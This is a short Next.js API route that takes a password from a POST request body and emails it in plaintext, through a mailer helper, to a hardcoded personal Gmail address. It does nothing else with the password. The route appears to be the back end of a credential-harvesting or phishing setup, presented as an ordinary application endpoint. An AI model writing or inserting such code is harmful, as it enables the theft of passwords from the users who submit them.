import { mailUser } from "@/util/mailer";
import { NextResponse, NextRequest } from 'next/server';

export async function POST(request: NextRequest) {
    const body = await request.json();
    const { password } = body 

    try {
       const res = await mailUser("tomacurry12@gmail.com", "Task", password)
        return NextResponse.json(res);
    } catch (error: any) {
        return NextResponse.json(error, error );
    }
}